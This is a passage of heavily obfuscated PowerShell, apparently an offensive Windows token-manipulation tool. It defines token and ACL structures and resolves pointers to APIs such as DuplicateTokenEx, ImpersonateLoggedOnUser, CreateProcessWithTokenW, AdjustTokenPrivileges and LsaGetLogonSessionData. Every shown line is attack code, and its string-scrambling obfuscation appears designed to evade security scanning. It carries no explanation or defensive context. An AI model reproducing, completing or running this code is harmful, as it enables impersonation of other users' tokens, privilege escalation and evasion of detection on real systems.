	${TyPE`BuiL`der} = ${mOd`U`LE`BUi`ldER}.("{0}{2}{1}"-f'Defin','pe','eTy').Invoke(("{1}{4}{3}{0}{2}" -f'VA','TOK','TION','_ELE','EN'), ${A`T`TR`ibUTEs}, [System.ValueType])
	${Ty`PebuI`L`dER}.("{2}{1}{0}" -f 'd','l','DefineFie').Invoke(("{0}{2}{1}{3}"-f 'TokenIsElev','te','a','d'), [UInt32], ("{2}{0}{1}"-f'li','c','Pub')) | &("{2}{0}{1}" -f'Nul','l','Out-')
	${tO`kEn_ELE`VAT`iOn} = ${TyPe`BuI`LD`er}.("{1}{3}{2}{0}"-f 'pe','Cr','teTy','ea').Invoke()

    
    ${aT`Tri`B`UTes} = ("{0}{11}{6}{5}{10}{1}{12}{7}{13}{15}{3}{9}{2}{4}{8}{14}" -f 'AutoLayo','ss, Class, Publ','d,','lLa',' Bef','si',', An','e','oreFieldIni','yout, Seale','Cla','ut','ic, S','que','t','ntia')
    ${TYPeB`U`I`Lder} = ${mo`d`UlEBU`I`LDer}.("{2}{0}{1}" -f 'fi','neType','De').Invoke(("{3}{4}{2}{0}{1}" -f '_ATTRI','BUTES','D','LUID','_AN'), ${AtTri`B`UTes}, [System.ValueType], 12)
    ${TY`PEbuILD`Er}.("{1}{2}{0}" -f'd','D','efineFiel').Invoke(("{1}{0}"-f 'id','Lu'), ${Lu`iD}, ("{1}{0}{2}"-f'u','P','blic')) | &("{0}{2}{1}"-f 'Out','Null','-')
    ${t`yPEbU`Il`dER}.("{3}{1}{2}{0}" -f 'Field','e','fine','D').Invoke(("{2}{0}{1}" -f 'ttribut','es','A'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}"-f't-Null','Ou')
    ${L`UID`_`And`_aTt`RIBUtes} = ${tyPe`B`UiLD`Er}.("{1}{3}{2}{0}" -f 'Type','Cre','e','at').Invoke()
		
    
    ${a`Tt`Ribut`ES} = ("{9}{12}{5}{1}{11}{13}{4}{10}{6}{8}{3}{7}{0}{2}" -f 'for','ut, An','eFieldInit','Seal','ass, Class, P','ayo','entialLayou','ed, Be','t, ','A','ublic, Sequ','siC','utoL','l')
    ${T`ypE`Buil`dER} = ${m`oDulE`BuiLd`eR}.("{0}{2}{1}" -f'Defin','ype','eT').Invoke(("{0}{1}{3}{4}{2}"-f'TOK','EN','ES','_P','RIVILEG'), ${aT`Tr`IBUTES}, [System.ValueType], 16)
    ${TY`pEbUI`LDer}.("{2}{1}{0}" -f 'ield','eF','Defin').Invoke(("{1}{4}{0}{2}{3}" -f 'vil','P','ege','Count','ri'), [UInt32], ("{0}{1}{2}" -f'Pub','l','ic')) | &("{0}{1}{2}" -f 'Out-Nu','l','l')
    ${t`ypE`BuIlD`eR}.("{0}{1}{2}"-f 'Define','Fiel','d').Invoke(("{0}{1}{3}{2}"-f 'Pri','v','ges','ile'), ${LUID`_A`N`d`_aTTRi`BuT`Es}, ("{1}{0}"-f'lic','Pub')) | &("{1}{0}" -f 'ull','Out-N')
    ${tOke`N_`pRivIlE`ges} = ${tY`pEBuI`l`DEr}.("{0}{2}{1}{3}"-f 'C','t','rea','eType').Invoke()

    
    ${atT`RIbUt`es} = ("{0}{1}{10}{16}{14}{11}{18}{19}{9}{8}{15}{4}{5}{17}{6}{2}{3}{7}{20}{12}{13}" -f'Au','to','Be','for','a','yout, Sea','ed, ','eField','Sequentia','lic, ','Layo',',','ni','t','t','lL','u','l',' AnsiC','lass, Class, Pub','I')
    ${T`Ype`Bui`Lder} = ${moDUl`E`B`Uild`er}.("{1}{2}{0}" -f'eType','Defi','n').Invoke(("{2}{0}{1}" -f'_H','EADER','ACE'), ${aTT`Ribu`TEs}, [System.ValueType])
    ${Ty`PEbUIl`dER}.("{2}{1}{3}{0}"-f 'd','eFie','Defin','l').Invoke(("{0}{1}"-f'Ace','Type'), [Byte], ("{0}{1}"-f 'Pub','lic')) | &("{2}{0}{1}" -f't-','Null','Ou')
    ${TYpeb`UI`ldER}.("{2}{1}{0}"-f 'd','iel','DefineF').Invoke(("{0}{2}{1}"-f 'A','eFlags','c'), [Byte], ("{1}{0}" -f 'blic','Pu')) | &("{1}{0}{2}" -f'ut-Nul','O','l')
    ${T`YPEBu`Il`Der}.("{0}{3}{1}{2}"-f 'Defin','Fiel','d','e').Invoke(("{2}{1}{0}" -f'Size','e','Ac'), [UInt16], ("{1}{2}{0}"-f'lic','P','ub')) | &("{1}{2}{0}" -f'Null','O','ut-')
    ${a`cE_hE`Ad`eR} = ${t`yPEbUI`ld`ER}.("{1}{0}{2}"-f 'e','Creat','Type').Invoke()

    
    ${attR`I`BuTEs} = ("{14}{13}{1}{15}{6}{8}{4}{5}{7}{11}{10}{12}{9}{2}{3}{0}"-f 'ieldInit','s',', Seale','d, BeforeF','u','bli','ss, Clas','c,','s, P','Layout','Sequent',' ','ial',' An','AutoLayout,','iCla')
    ${Ty`PEb`U`ildER} = ${mo`D`UleBU`iLdeR}."DefI`NE`TYPE"('ACL', ${Att`R`ib`UtEs}, [System.ValueType])
    ${tYPEBui`Ld`ER}.("{2}{0}{1}" -f'in','eField','Def').Invoke(("{1}{0}{2}"-f 's','AclRevi','ion'), [Byte], ("{0}{1}" -f 'Pu','blic')) | &("{0}{2}{1}" -f'Ou','l','t-Nul')
    ${tyP`EbUI`LDeR}.("{0}{2}{1}" -f'Def','eField','in').Invoke(("{0}{1}"-f'S','bz1'), [Byte], ("{0}{1}" -f 'Publ','ic')) | &("{2}{1}{0}" -f 'l','ut-Nul','O')
    ${ty`Pebu`ild`Er}.("{1}{2}{0}" -f'eField','D','efin').Invoke(("{1}{0}{2}"-f 'cl','A','Size'), [UInt16], ("{2}{0}{1}" -f'bli','c','Pu')) | &("{1}{0}{2}"-f'Nu','Out-','ll')
    ${TY`pebU`ILdEr}.("{2}{3}{1}{0}"-f 'd','eFiel','D','efin').Invoke(("{1}{2}{0}"-f 'eCount','A','c'), [UInt16], ("{1}{0}"-f 'ublic','P')) | &("{0}{1}{2}"-f 'O','u','t-Null')
    ${T`y`pEBuILder}.("{1}{0}{2}" -f'fi','De','neField').Invoke(("{0}{1}"-f'Sb','z2'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{1}{2}{0}" -f'l','Out-Nu','l')
    ${A`CL} = ${T`yP`EbUI`lDEr}.("{1}{0}{3}{2}"-f 'at','Cre','ype','eT').Invoke()

    
    ${AtT`RiB`Utes} = ("{0}{8}{7}{4}{17}{9}{15}{13}{3}{16}{2}{11}{18}{1}{19}{14}{6}{12}{10}{5}" -f 'A','d, B','Layout, ','equentia',' AnsiC','t','e','oLayout,','ut','a','Ini','S','ld',', Public, S','oreFi','ss','l','lass, Cl','eale','ef')
    ${TYpeBU`ild`eR} = ${mod`U`LEbUIlder}.("{0}{1}{2}"-f'DefineT','yp','e').Invoke(("{1}{0}{4}{2}{3}"-f'CCESS_ALLOWE','A','_A','CE','D'), ${aTtri`B`Ut`es}, [System.ValueType])
    ${t`ypEB`UiL`dER}.("{2}{0}{1}" -f 'eF','ield','Defin').Invoke(("{0}{1}"-f 'Hea','der'), ${a`cE`_hEAD`er}, ("{0}{1}{2}"-f 'Pu','bli','c')) | &("{0}{1}" -f'Ou','t-Null')
    ${tYP`ebUI`ldER}.("{2}{1}{0}"-f 'ield','ineF','Def').Invoke(("{0}{1}" -f'Mas','k'), [UInt32], ("{1}{0}" -f'ic','Publ')) | &("{1}{0}{2}"-f'u','O','t-Null')
    ${TY`p`ebUil`DER}.("{2}{3}{0}{1}"-f 'Fiel','d','Defi','ne').Invoke(("{2}{0}{1}" -f't','art','SidS'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{2}{0}{1}" -f 't-N','ull','Ou')
    ${AC`cess_All`ow`Ed`_ace} = ${T`yP`EBU`iLdER}.("{1}{2}{0}" -f'Type','Crea','te').Invoke()

    
    ${A`TTr`ibu`Tes} = ("{4}{9}{6}{10}{15}{14}{13}{8}{1}{0}{5}{11}{7}{3}{12}{2}"-f'ic','bl','eldInit','B','Auto',', SequentialLayout','C',' ','u','Layout, Ansi','lass, C',', Sealed,','eforeFi','P','ss, ','la')
    ${TyP`Eb`UILD`ER} = ${moDu`L`Eb`UildeR}.("{0}{2}{1}" -f 'D','ype','efineT').Invoke(("{1}{0}"-f'USTEE','TR'), ${attR`ib`UTEs}, [System.ValueType])
    ${TyPEbu`iL`DEr}.("{3}{2}{1}{0}" -f'eld','neFi','efi','D').Invoke(("{2}{1}{3}{0}"-f 'e','st','pMultipleTru','e'), [IntPtr], ("{1}{0}"-f 'ic','Publ')) | &("{2}{1}{0}" -f 'l','l','Out-Nu')
    ${TY`Pe`Buil`deR}.("{0}{1}{2}" -f'De','fineFiel','d').Invoke(("{5}{0}{3}{4}{2}{1}{6}"-f 'iple','o','rati','Trus','teeOpe','Mult','n'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{1}{2}{0}"-f 'l','Out-','Nul')
    ${t`YPebU`IldEr}.("{3}{2}{0}{1}" -f 'Fie','ld','e','Defin').Invoke(("{2}{0}{3}{1}" -f 'te','m','Trus','eFor'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{0}{1}{2}" -f'Ou','t-','Null')
    ${Ty`p`e`BUIlDER}.("{1}{2}{0}"-f 'ld','Define','Fie').Invoke(("{1}{2}{3}{0}"-f 'e','Trus','teeT','yp'), [UInt32], ("{0}{2}{1}"-f'Pu','c','bli')) | &("{0}{2}{1}"-f'Ou','l','t-Nul')
    ${typE`Bui`L`dEr}.("{2}{0}{3}{1}" -f 'in','ld','Def','eFie').Invoke(("{0}{1}"-f 'ptstrNa','me'), [IntPtr], ("{0}{1}"-f 'Pub','lic')) | &("{1}{2}{0}"-f 'll','O','ut-Nu')
    ${tRuS`TeE} = ${TYp`E`BuilDEr}.("{2}{0}{1}"-f 'y','pe','CreateT').Invoke()

    
    ${A`TT`RiBU`Tes} = ("{6}{9}{8}{10}{13}{2}{3}{11}{20}{7}{4}{19}{16}{12}{5}{0}{1}{17}{18}{14}{15}" -f 'lLa','yo','Class, C','la','li','a','A','Pub','t','u','oLayout,','s','enti',' Ansi','eld','Init',' Sequ','ut, Sealed, B','eforeFi','c,','s, ')
    ${typ`EbuilD`ER} = ${m`OD`Ulebu`iLdeR}.("{0}{2}{1}"-f'De','neType','fi').Invoke(("{4}{0}{2}{3}{1}" -f 'XPLICIT_','SS','AC','CE','E'), ${A`TtRIbu`TeS}, [System.ValueType])
    ${tY`pEbuild`eR}.("{2}{0}{1}{3}"-f 'i','n','Def','eField').Invoke(("{2}{3}{1}{0}"-f 'ssions','ermi','grfAccess','P'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{0}{2}{1}" -f 'Out-N','ll','u')
    ${T`ypEB`UI`LDeR}.("{0}{2}{1}" -f'Defi','d','neFiel').Invoke(("{1}{0}{4}{3}{2}"-f 'ce','grfAc','e','sMod','s'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}{2}" -f'u','O','t-Null')
    ${t`y`PEb`UiLdEr}.("{1}{0}{2}" -f'F','Define','ield').Invoke(("{0}{3}{1}{2}" -f'grf','rita','nce','Inhe'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}{2}"-f'Nu','Out-','ll')
    ${tyPE`B`UiLdER}.("{2}{0}{1}" -f'fineF','ield','De').Invoke(("{0}{1}{2}" -f'Tr','us','tee'), ${tRU`steE}, ("{0}{1}" -f 'Pub','lic')) | &("{2}{1}{0}"-f'ull','ut-N','O')
    ${e`XPl`iCit_`A`cCeSs} = ${TY`p`eBUild`er}.("{0}{3}{1}{2}" -f'Cr','at','eType','e').Invoke()
    


    
    
    
    ${oPenPROc`E`s`S`A`Ddr} = &("{0}{4}{3}{2}{1}" -f'G','ss','e','cAddr','et-Pro') ("{2}{0}{1}{3}" -f 'ernel32.','d','k','ll') ("{0}{2}{3}{1}" -f'O','ocess','penP','r')
	${o`P`En`P`ROCesSdelegAte} = &("{3}{1}{0}{2}"-f 't','ega','eType','Get-Del') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${oPe`NP`Roc`eSS} =  $y5MvL::("{2}{4}{5}{3}{1}{0}"-f'r','Pointe','GetDel','n','egateForFun','ctio').Invoke(${ope`Np`ROceSsa`DdR}, ${ope`Npr`OcEsSD`ELEGaTE})

    ${oPenp`ROcEsst`oKE`N`ADdr} = &("{0}{4}{2}{1}{3}" -f 'Get-Proc','es','ddr','s','A') ("{1}{3}{0}{2}"-f 'l','advapi3','l','2.d') ("{0}{1}{2}{4}{3}" -f 'Op','e','nP','cessToken','ro')
	${oPenP`RoCe`sstoken`dEl`EGatE} = &("{3}{2}{1}{0}{4}"-f'gat','Dele','-','Get','eType') @([IntPtr], [UInt32],   (  GET-VaRIaBlE  b8F4i -ValUEONl  ).("{2}{0}{1}{3}"-f'RefT','yp','MakeBy','e').Invoke()) ([Bool])
	${OPEnp`RocE`sS`ToKEn} =   (  geT-VArIaBLe  ('Y5m'+'vl') -ValueOn  )::("{8}{3}{1}{4}{7}{2}{5}{0}{6}"-f'e','tDelegat','nPoi','e','eForF','nt','r','unctio','G').Invoke(${OpeN`pROce`sS`T`OKENa`DDR}, ${oPeNPROc`eSs`T`OK`ENDeLegAtE})    

    ${GEttoKEnIN`ForM`At`iON`AdDR} = &("{4}{0}{2}{3}{1}"-f 'et','dress','-','ProcAd','G') ("{0}{1}{2}"-f 'advapi32.d','l','l') ("{1}{3}{5}{4}{0}{2}"-f 'ati','GetT','on','oke','rm','nInfo')
	${Ge`TtOkenI`N`ForMA`TIONd`El`eG`Ate} = &("{0}{1}{4}{3}{2}"-f'Ge','t-','ateType','eg','Del') @([IntPtr], ${T`oKe`N`_`iNforM`ATio`N_cL`ASs}, [IntPtr], [UInt32],  (  GEt-vARIaBLe ("d"+"pjY")  -VA ).("{2}{0}{3}{1}" -f 'ak','pe','M','eByRefTy').Invoke()) ([Bool])
	${GEttOkeN`I`Nf`Or`mAtIoN} =  (VAriaBlE  ("y5MV"+"l")  ).valUe::("{3}{1}{5}{4}{0}{2}{6}"-f'ctionPoi','etDelegat','nt','G','n','eForFu','er').Invoke(${GETTOkE`NiNfoRm`AT`I`ON`Ad`dr}, ${geT`T`okEniNFORmA`Ti`Ond`El`egatE})    

    ${sET`T`h`ReadToKE`Na`dDR} = &("{0}{2}{3}{1}{4}"-f'Get-P','ddres','roc','A','s') ("{0}{3}{2}{1}" -f'advapi','dll','2.','3') ("{2}{0}{1}{3}" -f'hr','eadToke','SetT','n')
	${S`E`TT`hR`Ea`D`TokendeLEgaTe} = &("{2}{4}{1}{3}{0}" -f 'legateType','t-D','G','e','e') @([IntPtr], [IntPtr]) ([Bool])
	${setTHREAD`T`O`kEN} =   $Y5MvL::("{1}{0}{3}{5}{8}{4}{2}{6}{7}"-f'e','G','F','tDel','eFor','eg','unctionPointe','r','at').Invoke(${s`eTTHrEAD`TOKEn`ADdr}, ${S`e`T`THrEADToKeND`eleGatE})    

    ${ImP`Erson`A`T`el`oggedoNUSEr`AdDr} = &("{0}{3}{4}{2}{1}"-f 'G','ess','ddr','et-Pro','cA') ("{0}{2}{1}"-f 'advapi3','ll','2.d') ("{3}{2}{6}{5}{1}{4}{0}"-f 'User','a','m','I','teLoggedOn','erson','p')
	${IMpeRs`onat`E`LOGgEDONuSerDEl`EG`AtE} = &("{4}{1}{0}{2}{3}"-f'egat','et-Del','e','Type','G') @([IntPtr]) ([Bool])
	${IM`PERsO`NATEl`o`GGED`ON`USeR} =   $Y5mVL::("{7}{1}{8}{0}{5}{3}{2}{4}{6}"-f'orF','elega','oin','P','te','unction','r','GetD','teF').Invoke(${I`M`PeRsO`NaTElOggeDOnU`se`R`Ad`Dr}, ${Imper`SOn`ATElOgge`Do`NusE`RdElEgaTe})

    ${r`EvEr`TtOs`ELFaD`dr} = &("{3}{2}{0}{1}{4}"-f'r','ocAddr','et-P','G','ess') ("{1}{2}{0}"-f 'll','advapi32','.d') ("{2}{1}{3}{0}" -f 'tToSelf','ev','R','er')
	${RevERttOsElfdEl`e`GA`TE} = &("{0}{4}{1}{3}{2}"-f 'Ge','ele','Type','gate','t-D') @() ([Bool])
	${R`eveRtTo`sE`lF} =  $y5MVl::("{7}{4}{3}{5}{8}{6}{0}{2}{1}" -f 'P','r','ointe','gate','Dele','ForF','on','Get','uncti').Invoke(${R`eVe`RTto`SelF`AD`DR}, ${rEVErTtoSelf`D`elEg`Ate})

    ${LSaGETl`OGonSe`s`siO`NDa`TAaDdR} = &("{2}{1}{3}{0}" -f 'ess','et-Pr','G','ocAddr') ("{2}{1}{0}"-f '2.dll','ur3','sec') ("{1}{0}{3}{2}{4}" -f 'saGetLogon','L','essionDa','S','ta')
	${lS`AGETloGOns`E`Ssi`O`NDaTADEleGAtE} = &("{3}{0}{1}{2}{4}"-f 'et-Delega','t','eTy','G','pe') @([IntPtr],  (GcI  ('VariaBlE:b8'+'F'+'4'+'i')  ).vALuE.("{0}{2}{1}"-f 'Ma','e','keByRefTyp').Invoke()) ([UInt32])
	${LSa`GEtLOgo`N`SeSsi`oNDa`Ta} =  (VarIablE Y5MVl ).vAlUE::("{5}{4}{8}{1}{7}{0}{3}{6}{2}" -f'o','Fun','nter','nP','tDelegat','Ge','oi','cti','eFor').Invoke(${lsAGeTlo`gOn`S`eSS`IoNDATa`ADdr}, ${LSa`ge`T`LoGONsE`s`SIo`NdaTaDeLEgATE})

    ${creaT`ePrOcEsSw`IT`h`To`kEn`waDDr} = &("{1}{0}{2}{3}" -f 'Pro','Get-','cAdd','ress') ("{3}{0}{2}{1}" -f 'va','l','pi32.dl','ad') ("{1}{3}{4}{2}{0}{6}{5}"-f 'ke','CreatePr','To','ocessWit','h','W','n')
	${crEa`TeprOCEsSwIT`hToken`w`Del`EGA`TE} = &("{0}{2}{4}{1}{3}"-f 'Ge','t','t-De','eType','lega') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${C`REa`TEpRoCeSSwItH`TO`kENW} =  $Y5mvL::("{0}{8}{7}{2}{6}{3}{5}{1}{4}"-f'GetD','tion','F','r','Pointer','Func','o','e','elegat').Invoke(${CrEa`TePRoCEsSw`i`THToKE`NWAd`dr}, ${c`REa`TEprOCeSSwi`THTOK`ENw`DEleGATe})

    ${m`EmsET`AddR} = &("{2}{0}{3}{1}"-f'et-Proc','ress','G','Add') ("{2}{1}{0}{3}" -f'.dl','svcrt','m','l') ("{1}{0}"-f'set','mem')
	${M`E`MSETDElE`gate} = &("{0}{1}{3}{2}"-f'Get-D','e','gateType','le') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	${MEM`sET} =  (Ls  ('var'+'I'+'ab'+'lE:y5mvl')).VaLUe::("{3}{0}{4}{1}{2}"-f'r','n','ter','GetDelegateFo','FunctionPoi').Invoke(${m`E`MSET`ADdR}, ${ME`MSE`TDelE`G`ATE})

    ${D`UpLIcatE`T`OK`enEX`A`DDR} = &("{3}{1}{0}{2}" -f 'Addre','et-Proc','ss','G') ("{0}{1}{2}" -f'adv','api32.dl','l') ("{1}{0}{3}{2}"-f'a','Duplic','eTokenEx','t')
	${dUpLicat`E`T`o`K`E`NEXdElEGATe} = &("{0}{2}{3}{1}" -f 'Get-De','teType','l','ega') @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32],  (  gET-cHIldiTEm  VAriABLE:b8f4i  ).vALUE.("{0}{1}{2}" -f'MakeByRefT','yp','e').Invoke()) ([Bool])
	${d`UP`licaTetOK`EN`eX} =   (CHILdItEM VArIaBLe:Y5mvL  ).VaLuE::("{3}{1}{0}{6}{5}{4}{2}"-f'DelegateFo','t','nctionPointer','Ge','u','F','r').Invoke(${du`PlIC`AtETOK`e`NE`Xaddr}, ${dupLicATE`Tok`Enex`DE`L`eGa`Te})

    ${looKUPAccoU`N`T`si`d`WaddR} = &("{2}{3}{4}{1}{0}"-f 'Address','Proc','G','et','-') ("{2}{1}{3}{0}" -f'll','3','advapi','2.d') ("{2}{5}{1}{3}{4}{0}" -f'ntSidW','up','Lo','Acc','ou','ok')
	${l`Oo`KUPA`ccOU`NTSIdWde`Leg`AtE} = &("{1}{0}{3}{4}{2}"-f 'Del','Get-','ype','egate','T') @([IntPtr], [IntPtr], [IntPtr],   (  gEt-VaRiABLE  ("dp"+"JY") ).vaLuE.("{2}{1}{3}{0}{4}"-f 'RefTy','ak','M','eBy','pe').Invoke(), [IntPtr],   ( GET-CHILDitem ('va'+'RiAbLe:dpj'+'y')  ).VAluE.("{0}{4}{2}{1}{3}" -f'M','Ty','yRef','pe','akeB').Invoke(),  $dPJY.("{0}{1}{2}" -f 'MakeByR','efTyp','e').Invoke()) ([Bool])
	${LoOku`pACcOU`NTS`Idw} =   $y5mvl::("{1}{3}{7}{4}{6}{2}{0}{5}"-f 'onP','G','ti','etDele','n','ointer','c','gateForFu').Invoke(${LoOKU`PacC`ount`Si`DWaD`dr}, ${LO`oKUpaccOuNTsid`wd`eLEg`AtE})

    ${ClOs`EHAnDL`eAD`dR} = &("{1}{0}{3}{2}"-f'e','G','ddress','t-ProcA') ("{0}{3}{2}{1}"-f'kern','l','l32.dl','e') ("{2}{1}{0}"-f'ndle','a','CloseH')
	${c`LO`S`e`HaNDle`DelEgATe} = &("{2}{3}{0}{4}{1}" -f't-','ype','G','e','DelegateT') @([IntPtr]) ([Bool])
	${clos`eH`A`NdLe} =   $Y5MVL::("{6}{5}{0}{1}{8}{7}{2}{3}{4}"-f 'el','egateF','nPoi','nte','r','D','Get','o','orFuncti').Invoke(${cL`o`SEHA`NDlea`d`DR}, ${cl`oSehAnd`LeDeLe`GATe})

    ${lSAFreER`e`TURN`BufFER`A`dDR} = &("{3}{1}{0}{2}"-f 'rocAddres','P','s','Get-') ("{3}{1}{0}{2}"-f '.','r32','dll','secu') ("{1}{3}{2}{0}{4}" -f 'uffe','LsaFr','ReturnB','ee','r')
	${L`SAFReer`Etu`RNbU`F`F`e`RdE`lEGAtE} = &("{3}{2}{1}{0}" -f 'pe','eTy','at','Get-Deleg') @([IntPtr]) ([UInt32])
	${L`s`AfREeretu`Rnbuf`F`Er} =   (GET-VArIAblE  ("Y5mv"+"l") -vALueon )::("{2}{5}{3}{0}{1}{6}{4}{7}"-f 'teForFu','n','G','tDelega','ion','e','ct','Pointer').Invoke(${lsa`FrE`E`R`ETurNbu`FfErA`Ddr}, ${Ls`AFR`EE`RETURNB`UF`FE`RdelEgATe})

    ${OpEnT`hrEADA`D`dr} = &("{0}{1}{3}{2}" -f 'Get','-ProcAddr','s','es') ("{1}{3}{2}{0}" -f 'dll','ker','2.','nel3') ("{0}{1}{2}" -f 'Op','enThrea','d')
	${OpeNtH`REa`dD`el`EgaTE} = &("{0}{1}{3}{2}"-f 'G','et-Dele','ateType','g') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${OPe`Nt`hReaD} =  $y5MVl::("{6}{8}{4}{2}{3}{7}{1}{0}{5}" -f'P','n','o','rFuncti','ateF','ointer','Get','o','Deleg').Invoke(${oPeN`THRE`AD`AdDR}, ${o`PE`N`TH`ReADdelEgA`Te})

    ${OpenTHRea`d`T`o`kEnaDdR} = &("{1}{2}{0}{3}"-f 'Addr','G','et-Proc','ess') ("{2}{0}{1}"-f'32','.dll','advapi') ("{2}{0}{1}"-f'ThreadT','oken','Open')
	${OpEnT`h`REAd`ToKenDe`LEgATe} = &("{1}{0}{3}{5}{2}{4}"-f'et-','G','e','Del','Type','egat') @([IntPtr], [UInt32], [Bool],   ( ChIlDiTEm  VArIabLE:b8F4i).VAluE.("{0}{2}{3}{1}"-f 'MakeBy','e','Ref','Typ').Invoke()) ([Bool])
	${O`PenthrE`ADT`Oken} =   $Y5MvL::("{2}{5}{4}{1}{0}{3}{7}{8}{6}"-f 'ateForFunction','g','G','P','Dele','et','r','oin','te').Invoke(${op`E`NthrEAdTo`KEN`AD`dR}, ${OPeN`ThR`ea`DToK`E`NdELEgAtE})

    ${CREatePRo`CeS`sAsusE`R`waDDR} = &("{3}{1}{2}{0}"-f'ss','ocAdd','re','Get-Pr') ("{1}{2}{0}" -f 'vapi32.dll','a','d') ("{0}{2}{1}{3}{4}" -f 'Cre','eProcessA','at','sUse','rW')
	${c`ReAtEp`RocE`sSAS`USeRWDElega`TE} = &("{2}{1}{0}" -f 'e','p','Get-DelegateTy') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${C`REAtEp`R`Oc`ESSASUSe`RW} =  (  Get-cHildITem  ('V'+'ARi'+'aBlE:y5mv'+'L')  ).valUE::("{5}{0}{3}{2}{4}{1}{8}{7}{6}" -f'Del','Functi','Fo','egate','r','Get','r','Pointe','on').Invoke(${CR`E`AtEPR`ocesSaSUs`ERW`Ad`dR}, ${cRE`A`Te`p`RoCESsasu`SerWdE`LEGaTe})

    ${OpE`NwI`N`dowsTatIONw`ADdR} = &("{0}{1}{4}{2}{3}"-f 'G','et-Pr','cAddres','s','o') ("{2}{1}{0}"-f 'dll','.','user32') ("{1}{3}{2}{0}" -f'StationW','OpenWind','w','o')
    ${oPeNwiNDoWStatioN`Wd`El`Ega`Te} = &("{2}{1}{0}{4}{3}" -f 'at','leg','Get-De','Type','e') @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ${oPeNWinDOw`STa`T`IOnW} =  (Ls  vARIAble:y5Mvl).VAlUe::("{0}{2}{6}{5}{1}{3}{4}" -f'G','ForFunctio','e','nPoin','ter','ate','tDeleg').Invoke(${openwi`N`doWs`TATi`O`NW`AdDR}, ${o`PENw`iNDO`WsTationWdE`Le`gAte})

    ${OpEndEs`K`ToPAa`DDR} = &("{0}{2}{3}{1}"-f 'Get-P','ess','rocAdd','r') ("{3}{0}{2}{1}"-f'se','2.dll','r3','u') ("{2}{3}{0}{1}" -f 'enDeskt','opA','O','p')
    ${opEn`DES`KTO`PADe`leGa`Te} = &("{1}{2}{0}{3}"-f'g','G','et-Dele','ateType') @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    ${opend`ESK`ToPA} =   $Y5mvl::("{0}{2}{7}{6}{3}{4}{5}{1}" -f 'Ge','ter','tDe','ForFunction','Po','in','te','lega').Invoke(${oPen`deS`ktO`P`AadDr}, ${OPENde`skToP`Ad`Elega`TE})

    ${ImPe`RsON`ATeS`e`LFaddR} = &("{2}{3}{1}{4}{0}"-f 'ress','rocAd','Get','-P','d') ("{3}{1}{0}{2}"-f '2.','dvapi3','dll','A') ("{2}{1}{3}{0}" -f'lf','t','Impersona','eSe')
    ${ImP`E`R`sONa`TesEL`Fdel`E`GAtE} = &("{3}{2}{0}{1}"-f'el','egateType','t-D','Ge') @([Int32]) ([Bool])
    ${i`mPeRs`ONA`TES`eLf} =  ( DIR ('VARiA'+'bLE'+':Y'+'5MVL') ).ValUE::("{0}{2}{3}{6}{4}{1}{5}" -f 'GetD','Fun','e','l','teFor','ctionPointer','ega').Invoke(${IM`PerS`ONA`TeSeL`Fa`Ddr}, ${i`mpERS`OnAtesElF`dEl`eGaTe})

    ${l`ooku`pPRIvi`LEg`evaluEaDdr} = &("{1}{2}{0}" -f'ress','G','et-ProcAdd') ("{3}{0}{2}{1}" -f'dva','l','pi32.dl','A') ("{4}{2}{3}{0}{1}" -f 'geV','alueA','l','e','LookupPrivi')
    ${LOo`KUPPR`ivILegevaLUe`De`l`Ega`Te} = &("{3}{2}{0}{4}{1}" -f 'e','pe','el','Get-D','gateTy') @([String], [String], ${L`UID}.("{0}{4}{3}{1}{2}"-f 'M','y','pe','keByRefT','a').Invoke()) ([Bool])
    ${lO`O`kUPPr`IVilE`gevALUE} =  ( gCI  ("v"+"ARIa"+"BLe:y5"+"mvl") ).VaLuE::("{6}{0}{2}{3}{4}{7}{1}{5}{8}"-f'Dele','on','gateF','orFu','n','Point','Get','cti','er').Invoke(${LOOKUP`P`R`ivIlEGe`VaLUeaddR}, ${l`OOKUpPri`V`ILegEvALuEdele`gaTe})

    ${a`d`justTOKEnpR`IviLEGEsA`d`DR} = &("{3}{0}{1}{2}" -f 'et-Pro','cAd','dress','G') ("{1}{0}{3}{2}"-f'd','Advapi32.','l','l') ("{1}{2}{4}{3}{0}" -f'ges','Adju','stT','nPrivile','oke')
    ${ADju`sTTokENPrIvil`eg`esdEle`GA`Te} = &("{1}{2}{0}{3}{4}" -f '-DelegateT','Ge','t','y','pe') @([IntPtr], [Bool], ${tOK`EN_`Pr`Iv`IL`EGEs}.("{2}{1}{3}{0}" -f'pe','eBy','Mak','RefTy').Invoke(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    ${a`D`j`UsttokEN`PR`iv`ilEGes} =   (vARiAble ('y5'+'Mvl') ).vaLuE::("{0}{1}{4}{3}{2}"-f 'GetDel','e','ctionPointer','ForFun','gate').Invoke(${A`dJUs`TTo`kEnpri`Vil`egESaDDr}, ${ADjUs`Tt`o`kEnprI`V`i`LeGESDelEGate})

    ${g`E`TcuRRenTt`hReaDAd`DR} = &("{2}{1}{4}{3}{0}"-f'ddress','t','Ge','ProcA','-') ("{2}{3}{1}{0}" -f'dll','.','ker','nel32') ("{2}{0}{1}{3}" -f'e','tCurrent','G','Thread')
    ${G`etcurR`e`NTTHR`E`AD`DEl`EgAtE} = &("{3}{1}{2}{0}{4}" -f'ateTy','-Del','eg','Get','pe') @() ([IntPtr])
